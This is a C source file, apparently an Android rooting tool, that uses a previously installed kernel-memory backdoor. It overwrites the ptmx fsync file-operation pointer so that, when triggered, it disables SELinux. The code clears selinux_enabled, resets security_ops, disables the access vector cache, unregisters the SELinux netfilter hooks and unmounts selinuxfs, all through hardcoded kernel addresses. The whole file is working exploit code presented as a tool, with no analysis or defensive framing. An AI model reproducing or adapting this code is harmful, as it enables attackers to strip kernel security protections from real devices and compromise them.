#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "ptmx.h"
#include "backdoor_mmap.h"

#define ARRAY_SIZE(x)  (sizeof (x) / sizeof ((x)[0]))

#define reset_security_ops_address                0xc027ec94

static unsigned long int check_reset_security_ops[] = {
  0xe59f2008, //      LDR     R2, =0xc0fa6804 [$c027eca4] ; default_security_ops
  0xe59f3008, //      LDR     R3, =0xc1150630 [$c027eca8] ; security_ops
  0xe5832000, //      STR     R2, [R3]
  0xe12fff1e, //      BX      LR
  0xc0fa6804, //                                          ; default_security_ops
  0xc1150630, //                                          ; security_ops
};

#define DEFINE_CHECK(name)  { name##_address, check_##name, sizeof(check_##name) }

static struct {
  unsigned long int addr;
  const unsigned long int *expected;
  size_t size;
} check_code[] =
{
  DEFINE_CHECK(reset_security_ops),
};

static bool
check_unlock_code(void)
{
  unsigned long int *p;
  int pos;
  bool ret = true;

  for (pos = 0; pos < ARRAY_SIZE(check_code); pos++) {
    p = backdoor_convert_to_mmaped_address((void *)check_code[pos].addr);

    if (memcmp(p, check_code[pos].expected, check_code[pos].size) != 0) {
      int i;

      printf("kernel code doesn't match at 0x%08x !!\n", check_code[pos].addr);
      for (i = 0; i < check_code[pos].size / sizeof (check_code[pos].expected[0]); i++) {
        printf("  0x%08x\n", p[i]);
      }

      printf("\n");

      ret = false;
    }
  }

  return ret;
}

struct nf_hook_ops;

static struct nf_hook_ops *selinux_ipv4_ops = (void *)0xc0fa8620;
static struct nf_hook_ops *selinux_ipv6_ops = (void *)0xc0fa8674;

#define ARRAY_SIZE_selinux_ipv4_ops 3
#define ARRAY_SIZE_selinux_ipv6_ops 2

void (*nf_unregister_hooks)(struct nf_hook_ops *reg, unsigned int n) = (void *)0xc06a0000;

static void selinux_nf_ip_exit(void)
{
  nf_unregister_hooks(selinux_ipv4_ops, ARRAY_SIZE_selinux_ipv4_ops);
  nf_unregister_hooks(selinux_ipv6_ops, ARRAY_SIZE_selinux_ipv6_ops);
}

struct kobject;
struct vfsmount;
struct file_system_type;

static struct kobject *selinuxfs_kobj = (void *)0xc115168c;
static struct vfsmount *selinuxfs_mount = (void *)0xc1151690;
static struct file_system_type *sel_fs_type = (void *)0xc0fa8ab8;

static void (*kobject_put)(struct kobject *kobj) = (void *)0xc02c8134;
static void (*kern_unmount)(struct vfsmount *mnt) = (void *)0xc014ff30;
static int (*unregister_filesystem)(struct file_system_type *) = (void *)0xc014cc88;

static void exit_sel_fs(void)
{
  kobject_put(selinuxfs_kobj);
  kern_unmount(selinuxfs_mount);
  unregister_filesystem(sel_fs_type);
}

static int *p_ss_initialized = (void *)0xc11531a4;
static int *p_selinux_enabled = (void *)0xc0fa861c;

static void (*reset_security_ops)(void) = (void *)0xc027ec94;
static void (*avc_disable)(void) = (void *)0xc0280fb0;

int result_selinux_set_disable = false;

static void
selinux_set_disable(void)
{
  result_selinux_set_disable = false;

#if 0
  if (*p_ss_initialized) {
    return;
  }
#endif

  *p_selinux_enabled = 0;

  reset_security_ops();

  avc_disable();

  selinux_nf_ip_exit();

  exit_sel_fs();

  result_selinux_set_disable = true;
}

static bool
run_selinux_set_disable(void)
{
  int fd;

  fd = open(PTMX_DEVICE, O_WRONLY);
  fsync(fd);
  close(fd);

  return result_selinux_set_disable;
}

static bool
do_unlock(void)
{
  void **ptmx_fsync_address;
  unsigned long int ptmx_fops_address;
  bool ret = false;

  ptmx_fops_address = get_ptmx_fops_address();
  if (!ptmx_fops_address) {
    return false;
  }

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  if (check_unlock_code()) {
    ptmx_fsync_address = backdoor_convert_to_mmaped_address((void *)ptmx_fops_address + 0x38);
    *ptmx_fsync_address = selinux_set_disable;

    ret = run_selinux_set_disable();

    *ptmx_fsync_address = NULL;
  }

  backdoor_close_mmap();

  return ret;
}

int
main(int argc, char **argv)
{
  if (!do_unlock()) {
    printf("Failed to unlock LSM.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
